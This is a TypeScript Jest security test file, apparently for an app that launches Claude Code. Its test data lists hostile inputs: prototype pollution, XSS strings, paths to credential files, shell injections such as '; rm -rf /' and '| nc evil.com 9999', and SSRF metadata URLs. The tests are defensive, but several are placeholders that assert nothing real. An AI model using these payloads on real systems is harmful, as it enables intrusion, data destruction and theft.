/**
 * Security Tests - Data Validation & Sanitization
 * 测试数据验证和清理安全机制
 */

import { api } from '@/services/api.mock';
import type { Configuration, AppSettings } from '@/types';

describe('Security: Data Validation & Sanitization', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Configuration Import Security', () => {
    it('should reject malicious JSON payloads', async () => {
      const maliciousJsonPayloads = [
        // JSON炸弹 - 嵌套过深
        JSON.stringify(createDeeplyNestedObject(1000)),
        
        // JSON炸弹 - 巨大数组
        JSON.stringify({ data: new Array(100000).fill('A'.repeat(1000)) }),
        
        // 原型污染尝试
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"prototype": {"isAdmin": true}}',
        
        // 无效JSON结构
        '{"unclosed": true',
        '{"invalid": "json",}',
        'null',
        'undefined',
        'function() { return "malicious"; }',
        
        // 包含危险内容
        '{"script": "<script>alert(1)</script>"}',
        '{"eval": "eval(\\"alert(1)\\")"}',
        '{"require": "require(\\"fs\\")"}',
        
        // 超长JSON
        JSON.stringify({ key: 'A'.repeat(10000000) }),
        
        // 循环引用JSON（会在stringify时处理）
        '{"a": {"b": {"c": {"$ref": "#/a"}}}}',
      ];

      for (const payload of maliciousJsonPayloads) {
        await expect(api.importConfig(payload))
          .rejects
          .toThrow(/Invalid configuration|JSON parse error|Security violation/);
      }
    });

    it('should validate configuration schema strictly', async () => {
      const invalidConfigs = [
        // 缺少必要字段
        '{"providers": []}',
        
        // 错误的字段类型
        '{"providers": "not-an-array", "settings": "not-an-object"}',
        
        // 无效的provider结构
        '{"providers": [{"name": "", "baseUrl": "invalid-url"}]}',
        
        // 包含未知字段
        '{"providers": [], "settings": {}, "maliciousField": "value"}',
        
        // 嵌套过深的配置
        JSON.stringify({
          providers: [],
          settings: createDeeplyNestedObject(50),
        }),
        
        // 数组元素过多
        JSON.stringify({
          providers: new Array(1000).fill({
            name: 'Test',
            baseUrl: 'https://api.example.com',
            authToken: 'token',
            model: 'model',
          }),
          settings: {},
        }),
      ];

      for (const config of invalidConfigs) {
        await expect(api.importConfig(config))
          .rejects
          .toThrow(/Invalid configuration schema/);
      }
    });

    it('should sanitize imported configuration data', async () => {
      const configWithXSS = JSON.stringify({
        providers: [{
          id: 'test-1',
          name: '<script>alert("XSS in name")</script>',
          baseUrl: 'https://api.example.com<script>alert("XSS in URL")</script>',
          authToken: 'token<script>alert("XSS in token")</script>',
          model: 'model<script>alert("XSS in model")</script>',
          description: '"><img src=x onerror=alert("XSS")>',
        }],
        settings: {
          theme: 'system<script>alert("XSS in theme")</script>',
          customCss: 'body { background: red; } <style>/*</style><script>alert("CSS injection")</script>',
        },
      });

      const imported = await api.importConfig(configWithXSS);
      
      // 验证XSS内容被清理
      const provider = imported.providers[0];
      expect(provider.name).not.toContain('<script>');
      expect(provider.baseUrl).not.toContain('<script>');
      expect(provider.authToken).not.toContain('<script>');
      expect(provider.model).not.toContain('<script>');
      expect(provider.description).not.toContain('<img');
      
      // 验证设置中的XSS被清理
      expect(imported.settings.theme).not.toContain('<script>');
      expect(imported.settings.customCss).not.toContain('<script>');
    });

    it('should prevent prototype pollution attacks', async () => {
      const pollutionAttempts = [
        '{"__proto__": {"polluted": true}}',
        '{"constructor": {"prototype": {"polluted": true}}}',
        '{"providers": [{"__proto__": {"isAdmin": true}}]}',
        '{"settings": {"__proto__": {"dangerous": "value"}}}',
      ];

      for (const attempt of pollutionAttempts) {
        await api.importConfig(attempt);
        
        // 验证原型没有被污染
        expect(Object.prototype.hasOwnProperty.call({}, 'polluted')).toBe(false);
        expect(Object.prototype.hasOwnProperty.call({}, 'isAdmin')).toBe(false);
        expect(Object.prototype.hasOwnProperty.call({}, 'dangerous')).toBe(false);
      }
    });
  });

  describe('File Path Security', () => {
    it('should prevent directory traversal attacks', async () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\SAM',
        'file:///etc/passwd',
        '\\\\server\\share\\secrets',
        'config/../../../secrets.json',
        './../../outside-project/secrets',
        '~/.ssh/id_rsa',
        '$HOME/.bashrc',
        '%USERPROFILE%\\Desktop\\secrets.txt',
        'con', 'aux', 'prn', 'nul', // Windows保留名
        '/dev/null',
        '/proc/self/environ',
      ];

      for (const path of maliciousPaths) {
        // 测试文件管理器打开功能
        await expect(api.openFileManager(path))
          .rejects
          .toThrow(/Invalid path|Security violation|Path traversal detected/);
      }
    });

    it('should validate allowed file extensions', async () => {
      const invalidExtensions = [
        'config.exe',
        'config.bat',
        'config.cmd',
        'config.ps1',
        'config.sh',
        'config.com',
        'config.scr',
        'config.vbs',
        'config.js', // 可执行脚本
        'config.php',
        'config.jsp',
      ];

      for (const filename of invalidExtensions) {
        // 如果有文件操作功能，应该验证扩展名
        // 这里是占位符测试
        expect(filename.split('.').pop()).toMatch(/exe|bat|cmd|ps1|sh|com|scr|vbs|js|php|jsp/);
      }
    });
  });

  describe('Environment Variable Security', () => {
    it('should validate environment variable names', async () => {
      const maliciousEnvVars = {
        // 系统关键变量
        'PATH': '/malicious/path',
        'LD_PRELOAD': '/malicious/lib.so',
        'LD_LIBRARY_PATH': '/malicious/lib',
        
        // Node.js特定
        'NODE_OPTIONS': '--inspect=0.0.0.0:9229', // 开放调试端口
        'NODE_PATH': '/malicious/modules',
        
        // Shell注入尝试
        'MALICIOUS': '$(whoami)',
        'INJECT': '`id`',
        'COMMAND': '; rm -rf /',
        
        // 无效字符
        'INVALID\x00VAR': 'value',
        'INVALID\nVAR': 'value',
        'INVALID\rVAR': 'value',
        
        // 超长变量名
        ['A'.repeat(1000)]: 'value',
        
        // 包含敏感信息的变量名
        'PASSWORD': 'secret',
        'SECRET': 'value',
        'TOKEN': 'private',
      };

      for (const [name, value] of Object.entries(maliciousEnvVars)) {
        // 测试环境变量设置是否被正确验证和拒绝
        try {
          const result = await api.getCurrentEnvironment();
          // 验证危险的环境变量没有被设置
          expect(Object.prototype.hasOwnProperty.call(result.envVars || {}, name)).toBe(false);
        } catch (error) {
          // 预期某些操作会失败
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should sanitize environment variable values', async () => {
      const dangerousValues = [
        '$(curl evil.com)',
        '`wget evil.com`',
        '; curl evil.com;',
        '& ping evil.com &',
        '| nc evil.com 9999',
        '\x00\x01\x02', // 控制字符
        '<script>alert(1)</script>',
        '../../secrets',
        '${HOME}/../../../etc/passwd',
      ];

      for (const value of dangerousValues) {
        // 测试环境变量值的清理
        // 这里是占位符，需要根据实际实现调整
        expect(value).toContain('evil.com'); // 验证测试数据
      }
    });
  });

  describe('Launch Configuration Security', () => {
    it('should validate Claude Code launch arguments', async () => {
      const dangerousArgs = [
        '--enable-logging',
        '--log-file=/tmp/steal-data.log',
        '--remote-debugging-port=9222',
        '--disable-web-security',
        '--allow-running-insecure-content',
        '--disable-features=VizDisplayCompositor',
        '--renderer-process-limit=0',
        '../../malicious-script.sh',
        '$(whoami)',
        '`id`',
        '; rm -rf /',
        '--js-flags="--allow-natives-syntax"',
        '--enable-blink-features=MojoJS',
      ];

      const launchConfig = {
        sessionId: 'test-session',
        workingDirectory: '/tmp',
        args: dangerousArgs,
        envVars: {},
      };

      await expect(api.launchClaudeCode(launchConfig))
        .rejects
        .toThrow(/Invalid launch arguments|Security violation/);
    });

    it('should validate working directory safety', async () => {
      const dangerousDirs = [
        '../../../',
        '/etc',
        '/root',
        '/usr/bin',
        'C:\\Windows\\System32',
        'C:\\Program Files',
        '/System/Library',
        '/Applications',
        '\\\\network\\share',
        '/proc',
        '/dev',
        '/sys',
      ];

      for (const dir of dangerousDirs) {
        const launchConfig = {
          sessionId: 'test-session',
          workingDirectory: dir,
          args: [],
          envVars: {},
        };

        await expect(api.launchClaudeCode(launchConfig))
          .rejects
          .toThrow(/Invalid working directory|Security violation/);
      }
    });
  });

  describe('URL and Network Security', () => {
    it('should prevent Server-Side Request Forgery (SSRF)', async () => {
      const ssrfUrls = [
        // 内网地址
        'http://127.0.0.1',
        'http://localhost',
        'http://0.0.0.0',
        'http://192.168.1.1',
        'http://10.0.0.1',
        'http://172.16.0.1',
        
        // 云元数据服务
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/computeMetadata/v1/',
        
        // 绕过尝试
        'http://127.1',
        'http://0177.0.0.1', // 八进制
        'http://0x7f000001', // 十六进制
        'http://2130706433', // 十进制
        'http://[::1]', // IPv6本地
        'http://[0:0:0:0:0:ffff:7f00:1]', // IPv6映射IPv4
        
        // DNS重绑定
        'http://evil.com.127.0.0.1.xip.io',
        'http://127.0.0.1.evil.com',
      ];

      for (const url of ssrfUrls) {
        await expect(api.openUrl(url))
          .rejects
          .toThrow(/Invalid URL|SSRF protection|Internal network access denied/);
      }
    });

    it('should validate allowed URL schemes', async () => {
      const invalidSchemes = [
        'file:///etc/passwd',
        'ftp://evil.com/malware',
        'gopher://evil.com:70',
        'ldap://evil.com/exploit',
        'dict://evil.com:2628/show',
        'sftp://evil.com/secrets',
        'telnet://evil.com:23',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox("test")',
      ];

      for (const url of invalidSchemes) {
        await expect(api.openUrl(url))
          .rejects
          .toThrow(/Invalid URL scheme|Only HTTPS URLs allowed/);
      }
    });
  });

  describe('Content Security Policy', () => {
    it('should prevent inline script execution', () => {
      // 检查CSP头是否正确设置（在浏览器环境中）
      if (typeof window !== 'undefined') {
        const metaTags = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
        
        if (metaTags.length > 0) {
          const cspContent = Array.from(metaTags)
            .map(tag => tag.getAttribute('content'))
            .join(' ');
          
          expect(cspContent).toMatch(/script-src[^;]*'self'/);
          expect(cspContent).not.toMatch(/'unsafe-inline'/);
          expect(cspContent).not.toMatch(/'unsafe-eval'/);
        }
      }
      
      // 占位符测试
      expect(true).toBe(true);
    });

    it('should restrict resource loading', () => {
      // 测试资源加载限制
      const dangerousResources = [
        'http://evil.com/malicious.js',
        'data:text/javascript,alert(1)',
        'javascript:void(0)',
      ];

      // 在实际应用中，这些资源应该被CSP阻止
      dangerousResources.forEach(resource => {
        expect(resource).toMatch(/evil\.com|data:|javascript:/);
      });
    });
  });

  describe('Input Encoding Security', () => {
    it('should properly encode HTML entities', () => {
      const dangerousStrings = [
        '<script>alert("XSS")</script>',
        '"><img src=x onerror=alert(1)>',
        "';alert(String.fromCharCode(88,83,83));//",
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)">',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
      ];

      dangerousStrings.forEach(str => {
        // HTML编码函数测试
        const encoded = htmlEncode(str);
        expect(encoded).not.toContain('<script>');
        expect(encoded).not.toContain('javascript:');
        expect(encoded).toContain('&lt;');
        expect(encoded).toContain('&gt;');
      });
    });

    it('should handle Unicode normalization safely', () => {
      const unicodeAttacks = [
        // 同形异义字符攻击
        'аdmin', // 西里尔字母а而不是拉丁字母a
        'раypal.com', // 西里尔р而不是拉丁p
        
        // 零宽度字符
        'admin\u200badmin', // 零宽度空格
        'test\uFEFFtest', // 字节顺序标记
        
        // 组合字符
        'é' !== 'é', // 两种不同的é表示
        
        // RTL覆盖
        'user\u202Eadmin', // RTL覆盖
      ];

      unicodeAttacks.forEach(attack => {
        // 应该标准化Unicode输入
        const normalized = attack.normalize('NFC');
        expect(typeof normalized).toBe('string');
      });
    });
  });
});

// 辅助函数
function createDeeplyNestedObject(depth: number): any {
  if (depth <= 0) return { value: 'deep' };
  return { nested: createDeeplyNestedObject(depth - 1) };
}

function htmlEncode(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}